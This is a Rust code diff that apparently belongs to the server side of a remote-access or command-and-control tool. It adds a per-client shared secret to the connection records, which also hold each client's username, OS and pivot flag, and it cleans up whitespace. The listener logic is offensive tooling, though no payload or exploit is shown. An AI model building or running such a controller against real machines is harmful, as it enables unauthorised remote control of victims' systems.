@@ -1,7 +1,6 @@
 mod utils;
 mod locals;
 mod spawn;
-
 use clap::{Command, arg};
 
 use std::collections::HashMap;
@@ -9,13 +8,11 @@ use std::io::Write;
 use std::sync::Arc;
 use std::thread;
 
-// use colored::*;
 use rustyline::DefaultEditor;
 
 use tokio::runtime::Runtime;
 use tokio::sync::Mutex;
 use tokio::net::{TcpListener, TcpStream};
-
 use utils::ConnectionInfo;
 
 fn print_help() -> String {
@@ -218,10 +215,9 @@ pub async fn handle_connection(
     println!("{}", "\n[+] Connection recieved!");
     let mut stream = Arc::new(Mutex::new(stream));
     let hostname_clone = hostname.clone();
-
-    let (username, os) = utils::parse_client_info(&mut stream).await;
-    println!("username: {}, os: {}", username, os);
     
+    let (username, os, shared_secret) = utils::parse_client_info(&mut stream).await;
+    println!("username: {}, os: {}", username, os);
     let id = {
         let mut active_connections_lock = active_connections.lock().await;
             
@@ -241,14 +237,15 @@ pub async fn handle_connection(
                         is_pivot: false,
                         username: "".to_string(),
                         os: "".to_string(),
+                        shared_secret: *shared_secret.as_bytes(),
                     },
                 );
                 id
             }
         };  
         id
-    };        
-        
+    };
+
     {
         let mut active_connections_lock = active_connections.lock().await;
         active_connections_lock.insert(
@@ -260,12 +257,13 @@ pub async fn handle_connection(
                 is_pivot: false,
                 username: username.to_string(),
                 os: os.to_string(),
+                shared_secret: *shared_secret.as_bytes(),
             },
         );
     }
-        
+
     let active_connections_clone = Arc::clone(&active_connections);
-            
+
     // heartbeat check task for each connection
     tokio::spawn(async move {
         let data = [0; 1];
